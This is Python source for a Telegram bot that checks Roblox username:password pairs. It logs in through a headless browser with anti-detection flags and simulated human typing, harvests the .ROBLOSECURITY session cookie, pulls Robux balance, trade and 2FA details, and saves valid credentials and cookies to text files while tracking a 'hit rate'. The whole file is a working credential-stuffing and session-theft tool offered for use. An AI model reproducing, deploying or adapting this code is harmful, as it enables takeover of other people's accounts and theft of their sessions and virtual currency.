"""
ROBLOX ACCOUNT CHECKER TELEGRAM BOT
Created for Railway deployment
Commands: /chk username:password or type /chk then send username:password
"""

import os
import sys
import json
import time
import random
import asyncio
import logging
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum

# Telegram imports
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes

# ============ DEPENDENCY INSTALLER ============
def install_dependencies():
    """Auto-install missing dependencies"""
    print("[+] Checking dependencies...")
    
    dependencies = [
        "selenium",
        "requests",
        "undetected-chromedriver",
        "webdriver-manager",
        "python-telegram-bot==20.7"
    ]
    
    missing = []
    for dep in dependencies:
        try:
            if dep == "python-telegram-bot==20.7":
                import telegram
            else:
                __import__(dep.replace('-', '_'))
        except ImportError:
            missing.append(dep)
    
    if missing:
        print(f"[-] Installing: {', '.join(missing)}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
            print("[+] Dependencies installed successfully!")
        except Exception as e:
            print(f"[-] Installation error: {e}")
            sys.exit(1)
    
    print("[+] All dependencies ready!")

# Try importing, install if missing
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.common.exceptions import (
        TimeoutException, NoSuchElementException,
        WebDriverException, ElementNotInteractableException,
        InvalidSessionIdException
    )
    import undetected_chromedriver as uc
    from webdriver_manager.chrome import ChromeDriverManager
    import requests
    from requests.exceptions import ProxyError, ConnectTimeout
except ImportError:
    install_dependencies()
    print("\n[!] Restart the script!")
    sys.exit(1)

# ============ LOGGING SETUP ============
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============ DATA CLASSES ============
@dataclass
class Account:
    """Account data structure"""
    username: str
    password: str
    status: str = "unchecked"
    robux: int = 0
    premium: bool = False
    friends: int = 0
    cookies: Optional[Dict] = None
    verification_time: float = 0.0
    message: str = ""
    user_id: str = ""
    display_name: str = ""
    profile_url: str = ""
    avatar_url: str = ""
    description: str = ""
    account_age: str = ""
    join_date: str = ""
    followers: int = 0
    following: int = 0
    badges: int = 0
    groups_count: int = 0
    collectibles: int = 0
    account_banned: bool = False
    trade_count: int = 0
    email_verified: bool = False
    phone_enabled: bool = False
    can_trade: bool = False
    two_step_enabled: bool = False
    country_name: str = ""

# ============ ROBLOX API LOOKUP ============
class RobloxAPILookup:
    """Roblox API handler for account information"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def parse_date(self, date_str: str) -> str:
        """Parse date string to readable format"""
        if not date_str:
            return "Unknown Date"
        formats = ["%Y-%m-%dT%H:%M:%S.%fZ", "%Y-%m-%dT%H:%M:%SZ", "%m/%d/%Y %H:%M:%S"]
        for fmt in formats:
            try:
                return datetime.strptime(date_str, fmt).strftime("%Y-%m-%d %H:%M:%S")
            except ValueError:
                continue
        return "Unknown Date"
    
    def calculate_account_age(self, created_date: str) -> str:
        """Calculate account age from join date"""
        try:
            if created_date == "Unknown Date":
                return "Unknown"
            
            for fmt in ["%Y-%m-%d %H:%M:%S", "%Y-%m-%d", "%m/%d/%Y %H:%M:%S"]:
                try:
                    join_date = datetime.strptime(created_date, fmt)
                    break
                except ValueError:
                    continue
            else:
                return "Unknown"
            
            current_date = datetime.now()
            days = (current_date - join_date).days
            years = days // 365
            months = (days % 365) // 30
            remaining_days = (days % 365) % 30
            
            age_parts = []
            if years > 0:
                age_parts.append(f"{years}y")
            if months > 0:
                age_parts.append(f"{months}m")
            if remaining_days > 0 or (years == 0 and months == 0):
                age_parts.append(f"{remaining_days}d")
            
            return f"{' '.join(age_parts)} ({days} days)"
        except:
            return "Unknown"
    
    def get_user_id(self, username: str) -> Optional[str]:
        """Get user ID from username"""
        try:
            url = "https://users.roblox.com/v1/usernames/users"
            payload = {"usernames": [username], "excludeBannedUsers": False}
            response = self.session.post(url, json=payload, timeout=10)
            response.raise_for_status()
            data = response.json().get("data", [])
            if data and len(data) > 0:
                return data[0].get("id")
            return None
        except Exception as e:
            logger.error(f"Error getting user ID: {e}")
            return None
    
    def get_user_info(self, user_id: str) -> Optional[Dict]:
        """Get user profile information"""
        try:
            response = self.session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10)
            response.raise_for_status()
            return response.json()
        except Exception as e:
            logger.error(f"Error getting user info: {e}")
            return None
    
    def get_robux_balance(self, user_id: str, cookie: str) -> int:
        """Get Robux balance from account"""
        try:
            url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("robux", 0)
            return 0
        except Exception as e:
            logger.error(f"Error getting Robux balance: {e}")
            return 0
    
    def check_premium_status(self, user_id: str, cookie: str) -> bool:
        """Check if account has Premium membership"""
        try:
            url = "https://premiumfeatures.roblox.com/v1/user/premium"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                data = response.json()
                return data.get("isPremium", False)
            return False
        except Exception as e:
            logger.error(f"Error checking premium status: {e}")
            return False
    
    def get_friend_count(self, user_id: str) -> int:
        """Get friend count for account"""
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", timeout=10)
            return response.json().get("count", 0)
        except Exception as e:
            logger.error(f"Error getting friend count: {e}")
            return 0
    
    def get_follower_count(self, user_id: str) -> int:
        """Get follower count for account"""
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followers/count", timeout=10)
            return response.json().get("count", 0)
        except Exception as e:
            logger.error(f"Error getting follower count: {e}")
            return 0
    
    def get_following_count(self, user_id: str) -> int:
        """Get following count for account"""
        try:
            response = self.session.get(f"https://friends.roblox.com/v1/users/{user_id}/followings/count", timeout=10)
            return response.json().get("count", 0)
        except Exception as e:
            logger.error(f"Error getting following count: {e}")
            return 0
    
    def get_badge_count(self, user_id: str) -> int:
        """Get badge count for account"""
        try:
            response = self.session.get(f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100", timeout=10)
            data = response.json()
            return len(data.get("data", []))
        except Exception as e:
            logger.error(f"Error getting badge count: {e}")
            return 0
    
    def get_groups_count(self, user_id: str) -> int:
        """Get groups count for account"""
        try:
            response = self.session.get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles", timeout=10)
            data = response.json()
            return len(data.get("data", []))
        except Exception as e:
            logger.error(f"Error getting groups count: {e}")
            return 0
    
    def get_collectibles_count(self, user_id: str) -> int:
        """Get collectibles count for account"""
        try:
            response = self.session.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=1", timeout=10)
            return response.json().get("total", 0)
        except Exception as e:
            logger.error(f"Error getting collectibles count: {e}")
            return 0
    
    def get_avatar_url(self, user_id: str) -> str:
        """Get avatar thumbnail URL"""
        try:
            response = self.session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false", timeout=10)
            data = response.json()
            if data.get("data") and len(data["data"]) > 0:
                return data["data"][0].get("imageUrl", "N/A")
            return "N/A"
        except Exception as e:
            logger.error(f"Error getting avatar URL: {e}")
            return "N/A"
    
    def get_user_settings(self, cookie: str) -> Optional[Dict]:
        """Get user settings from account"""
        try:
            url = "https://www.roblox.com/my/settings/json"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json()
            return None
        except Exception as e:
            logger.error(f"Error getting user settings: {e}")
            return None
    
    def get_account_country(self, cookie: str) -> Optional[Dict]:
        """Get account country information"""
        try:
            url = "https://accountsettings.roblox.com/v1/account/settings/account-country"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("value", {})
            return None
        except Exception as e:
            logger.error(f"Error getting account country: {e}")
            return None
    
    def get_trade_count(self, cookie: str) -> int:
        """Get trade count for account"""
        try:
            url = "https://trades.roblox.com/v1/trades/inbound/count"
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            response = self.session.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                return response.json().get("count", 0)
            return 0
        except Exception as e:
            logger.error(f"Error getting trade count: {e}")
            return 0
    
    def get_full_account_info(self, username: str, cookie: str = None, user_id: str = None) -> Optional[Dict]:
        """Get complete account information"""
        try:
            if not user_id:
                user_id = self.get_user_id(username)
                if not user_id:
                    return None
            
            profile = self.get_user_info(user_id)
            if not profile:
                return None
            
            # Get basic stats
            friends = self.get_friend_count(user_id)
            followers = self.get_follower_count(user_id)
            following = self.get_following_count(user_id)
            badges = self.get_badge_count(user_id)
            groups_count = self.get_groups_count(user_id)
            collectibles = self.get_collectibles_count(user_id)
            avatar_url = self.get_avatar_url(user_id)
            
            # Get premium and Robux if cookie provided
            robux = 0
            premium = False
            trade_count = 0
            settings = None
            country = None
            
            if cookie:
                robux = self.get_robux_balance(user_id, cookie)
                premium = self.check_premium_status(user_id, cookie)
                trade_count = self.get_trade_count(cookie)
                settings = self.get_user_settings(cookie)
                country = self.get_account_country(cookie)
            
            join_date = self.parse_date(profile.get("created"))
            
            result = {
                "user_id": str(user_id),
                "display_name": profile.get("displayName", "N/A"),
                "profile_url": f"https://www.roblox.com/users/{user_id}/profile",
                "avatar_url": avatar_url,
                "description": profile.get("description", ""),
                "account_banned": profile.get("isBanned", False),
                "join_date": join_date,
                "account_age": self.calculate_account_age(join_date),
                "friends": friends,
                "followers": followers,
                "following": following,
                "badges": badges,
                "groups_count": groups_count,
                "collectibles": collectibles,
                "robux": robux,
                "premium": premium,
                "trade_count": trade_count
            }
            
            # Add settings if available
            if settings:
                result["email_verified"] = settings.get('IsEmailVerified', False)
                result["phone_enabled"] = settings.get('IsPhoneFeatureEnabled', False)
                result["can_trade"] = settings.get('CanTrade', False)
                result["two_step_enabled"] = settings.get('IsTwoStepToggleEnabled', False)
            
            # Add country if available
            if country:
                result["country_name"] = country.get('countryName', '')
            
            return result
        except Exception as e:
            logger.error(f"API Error: {e}")
            return None

# ============ DRIVER MANAGER ============
class DriverManager:
    """Manages Chrome WebDriver instances"""
    
    def __init__(self):
        self.active_drivers = {}
        self.driver_path = None
        self.setup_driver_path()
    
    def setup_driver_path(self) -> bool:
        """Setup ChromeDriver path"""
        try:
            print("[+] Setting up ChromeDriver...")
            self.driver_path = ChromeDriverManager().install()
            print(f"[+] ChromeDriver ready: {self.driver_path}")
            return True
        except Exception as e:
            print(f"[-] Webdriver-manager failed: {e}")
            print("[!] Trying manual paths...")
            
            common_paths = [
                r"C:\chromedriver\chromedriver.exe",
                r"C:\Windows\System32\chromedriver.exe",
                os.path.join(os.getcwd(), "chromedriver.exe"),
                os.path.join(os.path.expanduser("~"), "chromedriver.exe"),
                "/usr/local/bin/chromedriver",
                "/usr/bin/chromedriver"
            ]
            
            for path in common_paths:
                if os.path.exists(path):
                    self.driver_path = path
                    print(f"[+] Found ChromeDriver at: {self.driver_path}")
                    return True
            
            print("[-] ChromeDriver not found!")
            return False
    
    def create_driver(self, proxy: str = None, headless: bool = True) -> Optional[webdriver.Chrome]:
        """Create a new Chrome driver instance"""
        try:
            options = Options()
            
            # Base arguments
            base_args = [
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "--log-level=3",
            ]
            
            # Headless mode for Railway
            if headless:
                base_args.append("--headless=new")
                base_args.append("--disable-gpu")
                base_args.append("--window-size=1920,1080")
            
            # Add proxy if provided
            if proxy:
                base_args.append(f'--proxy-server={proxy}')
            
            for arg in base_args:
                options.add_argument(arg)
            
            # Preferences
            prefs = {
                "credentials_enable_service": False,
                "profile.password_manager_enabled": False,
                "profile.default_content_setting_values.notifications": 2,
                "intl.accept_languages": "en-US,en",
            }
            options.add_experimental_option("prefs", prefs)
            
            # Create driver
            if self.driver_path and os.path.exists(self.driver_path):
                service = Service(executable_path=self.driver_path)
                driver = webdriver.Chrome(service=service, options=options)
            else:
                driver = webdriver.Chrome(options=options)
            
            driver.set_page_load_timeout(15)
            driver.set_script_timeout(15)
            
            return driver
            
        except Exception as e:
            logger.error(f"Error creating driver: {e}")
            return None
    
    def cleanup_drivers(self):
        """Clean up all driver instances"""
        for driver_id, driver in self.active_drivers.items():
            try:
                driver.quit()
            except:
                pass
        self.active_drivers.clear()

# ============ TELEGRAM BOT ============
class RobloxCheckerBot:
    """Main Telegram bot class"""
    
    def __init__(self, token: str):
        self.token = token
        self.api_lookup = RobloxAPILookup()
        self.driver_manager = DriverManager()
        self.user_sessions = {}
        self.pending_checks = {}
        self.stats = {
            'total_checks': 0,
            'valid_accounts': 0,
            'premium_accounts': 0,
            'total_robux': 0,
            'start_time': datetime.now()
        }
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        welcome_msg = """
🤖 *ROBLOX ACCOUNT CHECKER BOT*

*Commands:*
/chk `<username:password>` - Check a single account
/chk - Then send username:password in next message
/stats - View bot statistics
/help - Show this help message

*Usage Examples:*
`/chk JohnDoe:password123`
or type `/chk` then send `JohnDoe:password123`

*Features:*
✅ Robux balance checking
✅ Premium membership status
✅ Friend count
✅ Account age verification
✅ Cookie extraction (valid accounts)
✅ Account settings (2FA, email verification)
✅ Country information

*Results are saved automatically!*
"""
        await update.message.reply_text(welcome_msg, parse_mode='Markdown')
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        await self.start_command(update, context)
    
    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        elapsed = (datetime.now() - self.stats['start_time']).total_seconds()
        minutes = elapsed / 60
        
        hit_rate = (self.stats['valid_accounts'] / self.stats['total_checks'] * 100) if self.stats['total_checks'] > 0 else 0
        
        stats_msg = f"""
📊 *BOT STATISTICS*

📈 *Overview:*
├ Total Checks: `{self.stats['total_checks']}`
├ Valid Accounts: `{self.stats['valid_accounts']}`
├ Hit Rate: `{hit_rate:.1f}%`
├ Premium Accounts: `{self.stats['premium_accounts']}`
├ Total Robux Found: `{self.stats['total_robux']:,}`
└ Uptime: `{minutes:.1f} minutes`

💾 *Saved Files:*
- `valid_accounts.txt` (Username:Password)
- `valid_cookies.txt` (Cookies)
- `account_details.txt` (Full details)

🤖 *Bot Status:* 🟢 Online
"""
        await update.message.reply_text(stats_msg, parse_mode='Markdown')
    
    async def chk_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /chk command"""
        user_id = update.effective_user.id
        
        # Check if argument provided with command
        if context.args and len(context.args) >= 1:
            account_input = ' '.join(context.args)
            await self.process_account_check(update, account_input)
        else:
            # Store that user is waiting for account input
            self.user_sessions[user_id] = 'waiting_for_account'
            await update.message.reply_text(
                "📝 *Please send the account in format:* `username:password`\n\n"
                "Example: `JohnDoe:pass123`\n\n"
                "Type /cancel to cancel.",
                parse_mode='Markdown'
            )
    
    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /cancel command"""
        user_id = update.effective_user.id
        if user_id in self.user_sessions:
            del self.user_sessions[user_id]
            await update.message.reply_text("✅ *Operation cancelled*", parse_mode='Markdown')
        else:
            await update.message.reply_text("ℹ️ *No active operation to cancel*", parse_mode='Markdown')
    
    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle regular messages (for account input)"""
        user_id = update.effective_user.id
        
        # Check if user is waiting for account input
        if user_id in self.user_sessions and self.user_sessions[user_id] == 'waiting_for_account':
            account_input = update.message.text.strip()
            
            # Check for cancel
            if account_input.lower() == '/cancel':
                del self.user_sessions[user_id]
                await update.message.reply_text("✅ *Operation cancelled*", parse_mode='Markdown')
                return
            
            del self.user_sessions[user_id]
            await self.process_account_check(update, account_input)
        else:
            # Not waiting for anything, show help
            await update.message.reply_text(
                "ℹ️ *Use /chk command to check an account*\n"
                "Example: `/chk username:password`",
                parse_mode='Markdown'
            )
    
    async def process_account_check(self, update: Update, account_input: str):
        """Process and check a single account"""
        chat_id = update.effective_chat.id
        user_id = update.effective_user.id
        
        # Parse username:password
        if ':' not in account_input:
            await update.message.reply_text(
                "❌ *Invalid format!*\nUse: `username:password`\nExample: `JohnDoe:pass123`",
                parse_mode='Markdown'
            )
            return
        
        username, password = account_input.split(':', 1)
        username = username.strip()
        password = password.strip()
        
        if not username or not password:
            await update.message.reply_text(
                "❌ *Username or password cannot be empty!*",
                parse_mode='Markdown'
            )
            return
        
        # Update stats
        self.stats['total_checks'] += 1
        
        # Send initial status message
        status_msg = await update.message.reply_text(
            f"🔍 *Checking account:* `{username}`\n"
            f"⏳ Launching browser...\n"
            f"🆔 Check ID: `{self.stats['total_checks']}`",
            parse_mode='Markdown'
        )
        
        # Run check in background
        asyncio.create_task(
            self.perform_account_check(chat_id, status_msg.message_id, username, password)
        )
    
    async def perform_account_check(self, chat_id: int, message_id: int, username: str, password: str):
        """Perform the actual account check"""
        driver = None
        cookie = None
        
        try:
            # Update status function
            async def update_status(text: str):
                try:
                    await self.application.bot.edit_message_text(
                        text, 
                        chat_id=chat_id, 
                        message_id=message_id, 
                        parse_mode='Markdown'
                    )
                except Exception as e:
                    logger.error(f"Error updating status: {e}")
            
            await update_status(f"🔍 *Checking:* `{username}`\n🌐 Initializing browser...")
            
            # Create driver
            driver = self.driver_manager.create_driver(headless=True)
            if not driver:
                await update_status(f"❌ *Failed:* `{username}`\nError: Could not initialize browser")
                return
            
            # Navigate to login
            await update_status(f"🔍 *Checking:* `{username}`\n📱 Navigating to Roblox...")
            driver.get("https://www.roblox.com/login")
            time.sleep(3)
            
            # Fill login form
            await update_status(f"🔍 *Checking:* `{username}`\n⌨️ Entering credentials...")
            
            try:
                # Find username field
                username_field = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "login-username"))
                )
                username_field.clear()
                # Type with slight delay to mimic human
                for char in username:
                    username_field.send_keys(char)
                    time.sleep(0.02)
                
                time.sleep(0.5)
                
                # Find password field
                password_field = driver.find_element(By.ID, "login-password")
                password_field.clear()
                for char in password:
                    password_field.send_keys(char)
                    time.sleep(0.02)
                
                time.sleep(0.5)
                
                # Click login button
                login_button = driver.find_element(By.ID, "login-button")
                login_button.click()
                
            except Exception as e:
                await update_status(f"❌ *Failed:* `{username}`\nError: Could not fill login form")
                driver.quit()
                return
            
            # Wait for login to process
            await update_status(f"🔍 *Checking:* `{username}`\n✅ Submitting login...")
            time.sleep(5)
            
            # Get current URL after login attempt
            current_url = driver.current_url.lower()
            
            # Check if login was successful
            if "home" in current_url or "users" in current_url or "avatar" in current_url:
                # Login successful!
                await update_status(f"🔍 *Checking:* `{username}`\n🎉 *LOGIN SUCCESSFUL!*\n📊 Fetching account data...")
                
                # Extract cookie
                try:
                    cookies = driver.get_cookies()
                    for c in cookies:
                        if c.get('name') == '.ROBLOSECURITY':
                            cookie = c.get('value')
                            break
                except Exception as e:
                    logger.error(f"Error extracting cookie: {e}")
                
                # Get detailed account info
                lookup_info = self.api_lookup.get_full_account_info(username, cookie)
                
                # Build success message
                result_msg = f"✅ *VALID ACCOUNT!*\n\n"
                result_msg += f"👤 *Username:* `{username}`\n"
                result_msg += f"🔑 *Password:* `{password}`\n"
                
                if lookup_info:
                    result_msg += f"\n📊 *Account Statistics:*\n"
                    result_msg += f"├ 🆔 *User ID:* `{lookup_info.get('user_id', 'N/A')}`\n"
                    result_msg += f"├ 👤 *Display Name:* `{lookup_info.get('display_name', 'N/A')}`\n"
                    result_msg += f"├ 📅 *Join Date:* `{lookup_info.get('join_date', 'N/A')}`\n"
                    result_msg += f"├ ⏱️ *Account Age:* `{lookup_info.get('account_age', 'N/A')}`\n"
                    result_msg += f"├ 👥 *Friends:* `{lookup_info.get('friends', 0):,}`\n"
                    result_msg += f"├ 👥 *Followers:* `{lookup_info.get('followers', 0):,}`\n"
                    result_msg += f"├ 👥 *Following:* `{lookup_info.get('following', 0):,}`\n"
                    result_msg += f"├ 🏅 *Badges:* `{lookup_info.get('badges', 0):,}`\n"
                    result_msg += f"├ 👥 *Groups:* `{lookup_info.get('groups_count', 0)}`\n"
                    result_msg += f"├ 💎 *Collectibles:* `{lookup_info.get('collectibles', 0):,}`\n"
                    result_msg += f"├ 💰 *Robux:* `{lookup_info.get('robux', 0):,}`\n"
                    result_msg += f"├ 👑 *Premium:* `{'✅ YES' if lookup_info.get('premium') else '❌ NO'}`\n"
                    result_msg += f"├ 🤝 *Trade Count:* `{lookup_info.get('trade_count', 0)}`\n"
                    
                    # Add settings if available
                    if lookup_info.get('email_verified') is not None:
                        result_msg += f"\n⚙️ *Account Settings:*\n"
                        result_msg += f"├ 📧 *Email Verified:* `{'✅' if lookup_info.get('email_verified') else '❌'}`\n"
                        result_msg += f"├ 📱 *Phone Enabled:* `{'✅' if lookup_info.get('phone_enabled') else '❌'}`\n"
                        result_msg += f"├ 🤝 *Can Trade:* `{'✅' if lookup_info.get('can_trade') else '❌'}`\n"
                        result_msg += f"└ 🔒 *2FA Enabled:* `{'✅' if lookup_info.get('two_step_enabled') else '❌'}`\n"
                    
                    # Add country if available
                    if lookup_info.get('country_name'):
                        result_msg += f"\n🌍 *Country:* `{lookup_info.get('country_name')}`\n"
                    
                    # Update stats
                    self.stats['valid_accounts'] += 1
                    if lookup_info.get('premium'):
                        self.stats['premium_accounts'] += 1
                    self.stats['total_robux'] += lookup_info.get('robux', 0)
                
                # Add cookie if available
                if cookie:
                    result_msg += f"\n🍪 *Cookie:*\n`{cookie[:50]}...{cookie[-20:] if len(cookie) > 70 else ''}`\n"
                    
                    # Save to files
                    with open('valid_accounts.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{username}:{password}\n")
                    
                    with open('valid_cookies.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{username}:{password}|{cookie}\n")
                    
                    # Save detailed info
                    with open('account_details.txt', 'a', encoding='utf-8') as f:
                        f.write("=" * 80 + "\n")
                        f.write(f"USERNAME: {username}\n")
                        f.write(f"PASSWORD: {password}\n")
                        if lookup_info:
                            for key, value in lookup_info.items():
                                f.write(f"{key.upper()}: {value}\n")
                        f.write(f"COOKIE: {cookie}\n")
                        f.write("=" * 80 + "\n\n")
                
                await update_status(result_msg)
                
            elif "login" in current_url:
                # Check for error messages
                try:
                    page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
                    
                    if "incorrect" in page_text or "wrong" in page_text:
                        await update_status(
                            f"❌ *INVALID PASSWORD*\n\n"
                            f"👤 *Username:* `{username}`\n"
                            f"🔑 *Password:* `{password}`\n\n"
                            f"The password is incorrect for this account."
                        )
                    elif "rate limit" in page_text or "too many" in page_text:
                        await update_status(
                            f"⚠️ *RATE LIMITED*\n\n"
                            f"👤 *Username:* `{username}`\n\n"
                            f"Please try again later."
                        )
                    else:
                        await update_status(
                            f"❌ *LOGIN FAILED*\n\n"
                            f"👤 *Username:* `{username}`\n"
                            f"🔑 *Password:* `{password}`\n\n"
                            f"Unknown error occurred during login."
                        )
                except:
                    await update_status(
                        f"❌ *LOGIN FAILED*\n\n"
                        f"👤 *Username:* `{username}`\n"
                        f"🔑 *Password:* `{password}`"
                    )
            else:
                await update_status(
                    f"❌ *ERROR CHECKING*\n\n"
                    f"👤 *Username:* `{username}`\n"
                    f"Unexpected response from server."
                )
                
        except TimeoutException:
            await update_status(
                f"⏰ *TIMEOUT*\n\n"
                f"👤 *Username:* `{username}`\n"
                f"Page took too long to load. Please try again."
            )
        except Exception as e:
            logger.error(f"Check error for {username}: {e}")
            await update_status(
                f"❌ *ERROR*\n\n"
                f"👤 *Username:* `{username}`\n"
                f"`{str(e)[:100]}`"
            )
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    async def run(self):
        """Run the bot"""
        # Build application
        self.application = Application.builder().token(self.token).build()
        
        # Add handlers
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CommandHandler("stats", self.stats_command))
        self.application.add_handler(CommandHandler("chk", self.chk_command))
        self.application.add_handler(CommandHandler("cancel", self.cancel_command))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
        
        # Start bot
        print("🤖 Starting Roblox Checker Bot...")
        await self.application.initialize()
        await self.application.start()
        await self.application.updater.start_polling()
        
        print(f"✅ Bot is running! @{self.application.bot.username}")
        print("=" * 50)
        print("Commands:")
        print("  /chk username:password - Check an account")
        print("  /stats - View statistics")
        print("  /help - Show help")
        print("=" * 50)
        
        # Keep running
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            print("\n🛑 Stopping bot...")
            await self.application.updater.stop()
            await self.application.stop()
            await self.application.shutdown()
            self.driver_manager.cleanup_drivers()
            print("✅ Bot stopped")

# ============ MAIN ============
def show_banner():
    """Display banner"""
    print("=" * 50)
    print("   ROBLOX ACCOUNT CHECKER BOT")
    print("   Telegram Bot Version")
    print("=" * 50)

def main():
    """Main entry point"""
    show_banner()
    
    # Install dependencies if needed
    install_dependencies()
    
    # Get bot token from environment or input
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    
    if not token:
        print("\n[?] No token found in environment variables")
        token = input("[?] Enter your Telegram Bot Token: ").strip()
    
    if not token:
        print("[-] Token is required! Get one from @BotFather")
        sys.exit(1)
    
    # Create and run bot
    bot = RobloxCheckerBot(token)
    
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        print("\n[!] Bot stopped by user")
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
